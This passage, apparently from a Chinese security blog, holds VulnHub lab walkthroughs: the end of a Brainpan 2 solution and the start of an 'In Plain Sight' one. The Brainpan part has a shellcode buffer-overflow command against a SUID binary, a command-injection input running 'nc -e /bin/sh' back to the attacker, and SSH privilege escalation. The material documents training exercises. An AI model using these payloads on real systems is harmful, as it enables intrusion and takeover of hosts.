class="string">&quot;\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5e\x3f\x89\x9f\xe1&quot;</span></span><br></pre></td></tr></table></figure>

<p>填好二个参数,并执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure>

<p>读取flag看看，看起来好像成功了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">flag.txt  whatif.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">$ cat whatif.txt</span><br><span class="line">cat whatif.txt</span><br><span class="line"></span><br><span class="line">       WHAT IF I TOLD YOU</span><br><span class="line">              ___</span><br><span class="line">            /     \ </span><br><span class="line">           | ______\</span><br><span class="line">          (, \_/ \_/</span><br><span class="line">           |   ._. |</span><br><span class="line">           \   --- /</span><br><span class="line">           /`-.__.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      .---&#x27;</span>`-.___|\___</span><br><span class="line">     /                `.</span><br><span class="line"></span><br><span class="line">       YOU ARE NOT ROOT?</span><br><span class="line">$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root  root  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..</span><br><span class="line">drwx------  2 root  root  4096 Nov  4  2013 .aptitude</span><br><span class="line">-rw-------  1 root  root     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc</span><br><span class="line">-rw-r--r--  1 root  root   159 Nov  5  2013 .profile</span><br><span class="line">-rw-------  1 root  root   461 Nov  5  2013 flag.txt</span><br><span class="line">-rw-------  1 root  root   245 Nov  5  2013 whatif.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg"></p>
<p>必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走…<br>寻找SUID/SGID执行权限的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null                                                                                                                                                                                        </span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/opt/old/brainpan-1.8/brainpan-1.8.exe</span><br><span class="line">...</span><br><span class="line">$ <span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line"><span class="built_in">cd</span> /opt/old/brainpan-1.8/</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">brainpan-1.8.exe  brainpan.7  brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;port=9333&quot;</span> &gt; brainpan.cfg</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ipaddr=0.0.0.0&quot;</span> &gt;&gt; brainpan.cfg</span><br><span class="line">$ cat brainpan.cfg</span><br><span class="line">cat brainpan.cfg</span><br><span class="line">port=9333</span><br><span class="line">ipaddr=0.0.0.0</span><br></pre></td></tr></table></figure>

<p>启动该应用程序并通过我的机器进行了连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./brainpan-1.8.exe</span><br><span class="line">./brainpan-1.8.exe</span><br><span class="line">port = 9333</span><br><span class="line">ipaddr = 0.0.0.0</span><br><span class="line">+ <span class="built_in">bind</span> <span class="keyword">done</span></span><br><span class="line">+ waiting <span class="keyword">for</span> connections...</span><br><span class="line">+ connection accepted</span><br></pre></td></tr></table></figure>

<p>nc连接之后，执行反弹命令获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9333</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 1.8________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777</span><br></pre></td></tr></table></figure>

<p>成功获取了puck用户的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">python -c <span class="string">&#x27;import os,pty;os.setresuid(1001,1001,1001);pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)</span><br><span class="line">puck@brainpan2:/opt/old/brainpan-1.8$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p>查看puck的文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home$ <span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Nov  5  2013 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh</span><br></pre></td></tr></table></figure>

<p>不是空的bash_history？真奇怪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ <span class="built_in">cd</span> .backup</span><br><span class="line"><span class="built_in">cd</span> .backup</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .</span><br><span class="line">drwx------ 4 puck puck 4096 Nov  5  2013 ..</span><br><span class="line">-rw------- 1 puck puck  395 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck puck 4096 Nov  4  2013 .ssh</span><br><span class="line">puck@brainpan2:/home/puck/.backup$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ls -l</span><br><span class="line">./msg_root <span class="string">&quot;comment on the latest version please&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /opt/brainpan/</span><br><span class="line">ps aux</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line"><span class="built_in">cd</span> ../archive</span><br><span class="line">netstat -antp</span><br><span class="line">netstat -antp | grep 9888</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> old</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> brainpan-1.8</span><br><span class="line">vi brainpan-1.8.c</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">vi brainpan.7</span><br><span class="line">man ./brainpan.7</span><br><span class="line">ls</span><br><span class="line">htop</span><br><span class="line">top</span><br><span class="line">ls -latr</span><br><span class="line">cat .bash_history </span><br><span class="line">ls</span><br><span class="line">mkdir .backup</span><br><span class="line">mv .ssh .bash* .backup</span><br><span class="line"><span class="built_in">cd</span> .backup/</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">ls -latr</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">puck@brainpan2:/home/puck/.backup$</span><br></pre></td></tr></table></figure>

<p>因此，puck用户可以通过ssh登录到/目录。我做到了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ mv .ssh .ssh-old</span><br><span class="line">mv .ssh .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">puck@brainpan2:/home/puck$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 4 puck  puck  4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .</span><br><span class="line">cp -rp .backup/.ssh .</span><br><span class="line">puck@brainpan2:/home/puck$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------ 5 puck  puck   4096 Feb  2 23:23 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..</span><br><span class="line">drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup</span><br><span class="line">-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile</span><br><span class="line">drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh</span><br><span class="line">drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old</span><br><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2</span><br><span class="line">ssh: connect to host brainpan2 port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>看看ssh是否没有运行或在其他端口上运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Package generated configuration file</span></span><br><span class="line"><span class="comment"># See the sshd_config(5) manpage for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What ports, IPs and protocols we listen for</span></span><br><span class="line">Port 2222</span><br><span class="line"><span class="comment"># Use these options to restrict which interfaces/protocols sshd will bind to</span></span><br><span class="line"><span class="comment">#ListenAddress ::</span></span><br><span class="line"><span class="comment">#ListenAddress 0.0.0.0</span></span><br><span class="line">ListenAddress 127.0.1.1</span><br><span class="line">Protocol 2</span><br><span class="line"><span class="comment"># HostKeys for protocol version 2</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_dsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line"><span class="comment">#Privilege Separation is turned on for security</span></span><br><span class="line">UsePrivilegeSeparation yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lifetime and size of ephemeral version 1 server key</span></span><br><span class="line">KeyRegenerationInterval 3600</span><br><span class="line">ServerKeyBits 768</span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line">SyslogFacility AUTH</span><br><span class="line">LogLevel INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"><span class="comment">#AuthorizedKeysFile     %h/.ssh/authorized_keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span></span><br><span class="line">IgnoreRhosts yes</span><br><span class="line"><span class="comment"># For this to work you will also need host keys in /etc/ssh_known_hosts</span></span><br><span class="line">RhostsRSAAuthentication no</span><br><span class="line"><span class="comment"># similar for protocol version 2</span></span><br><span class="line">HostbasedAuthentication no</span><br><span class="line"><span class="comment"># Uncomment if you don&#x27;t trust ~/.ssh/known_hosts for RhostsRSAAuthentication</span></span><br><span class="line"><span class="comment">#IgnoreUserKnownHosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable empty passwords, change to yes (NOT RECOMMENDED)</span></span><br><span class="line">PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to yes to enable challenge-response passwords (beware issues with</span></span><br><span class="line"><span class="comment"># some PAM modules and threads)</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment">#PasswordAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberos options</span></span><br><span class="line"><span class="comment">#KerberosAuthentication no</span></span><br><span class="line"><span class="comment">#KerberosGetAFSToken no</span></span><br><span class="line"><span class="comment">#KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="comment">#KerberosTicketCleanup yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GSSAPI options</span></span><br><span class="line"><span class="comment">#GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#GSSAPICleanupCredentials yes</span></span><br><span class="line"></span><br><span class="line">X11Forwarding yes</span><br><span class="line">X11DisplayOffset 10</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog yes</span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment">#UseLogin no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#MaxStartups 10:30:60</span></span><br><span class="line"><span class="comment">#Banner /etc/issue.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow client to pass locale environment variables</span></span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line">Subsystem sftp /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span></span><br><span class="line"><span class="comment"># and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="comment"># be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="comment"># PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="comment"># PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="comment"># the setting of &quot;PermitRootLogin without-password&quot;.</span></span><br><span class="line"><span class="comment"># If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="comment"># PAM authentication, then enable this but set PasswordAuthentication</span></span><br><span class="line"><span class="comment"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span></span><br><span class="line">UsePAM yes</span><br></pre></td></tr></table></figure>

<p>最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>popen()执行多个命令获取shell</li>
<li>gdb调试寻找缓冲区溢出的地址</li>
<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[In-Plain-Sight-1-0-1]</title>
    <url>/2020/01/10/In-Plain-Sight-1-0-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：In Plain Sight: 1.0.1<br>发布日期：2019年12月2日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUJaa0FOTUpETDQyMUtraUhWZVBsemMzT2Ezd3d6SFUvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19BZkANMJDL421KkiHVePlzc3Oa3wwzHU/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmE=">https://download.vulnhub.com/inplainsight/inplainsight1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmEudG9ycmVudA==">https://download.vulnhub.com/inplainsight/inplainsight1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：初学者-中级<br>说明：使用VirtualBox构建/测试。启用DHCP。需要root才能读取flag</p>
<ul>
<li>Changelog 2019-12-02：v1.0.1 2019-11-22：v1.0</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.108</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:48:A5:6E (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.108</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.56.108</span></span><br><span class="line">Connected to 192.168.56.108.</span><br><span class="line">220 IPS Corp</span><br><span class="line">Name (192.168.56.108:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           306 Nov 22 13:42 todo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat todo.txt</span><br><span class="line">?Invalid <span class="built_in">command</span></span><br><span class="line">ftp&gt; get todo.txt</span><br><span class="line"><span class="built_in">local</span>: todo.txt remote: todo.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> todo.txt (306 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">306 bytes received <span class="keyword">in</span> 0.02 secs (14.9999 kB/s)</span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat todo.txt </span></span><br><span class="line">mike - please get ride of that worthless wordpress instance! it<span class="string">&#x27;s a security ris</span></span><br><span class="line"><span class="string">k.  if you have privilege issues, please ask joe for assitance.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">joe - stop leaving backdoors on the system or your access will be removed! y</span></span><br><span class="line"><span class="string">our rabiit holes aren&#x27;</span>t enough <span class="keyword">for</span> these elite cyber hacking types.</span><br><span class="line"></span><br><span class="line">- boss person</span><br></pre></td></tr></table></figure>

<p>没有什么有用的信息，继续寻找敏感信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub149.jpg"></p>
<p>注意是index.htnl，打开此页面，随便点击一个地方</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub150.jpg"></p>
<p>出现如下的上传页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub151.jpg"></p>
<p>可以看到，该网页允许上传任何图像。因此，这里尝试上传图像，但成功了，但是当尝试上传.php文件时，网页给了一个错误。在进一步探索之后，该网页的URL引起了注意，可以看到它看起来像一个hash，因此我们将其复制并尝试使用john对其进行破解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john pass</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-AxCrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-Linkedin&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;ripemd-160&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ripemd-160&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span 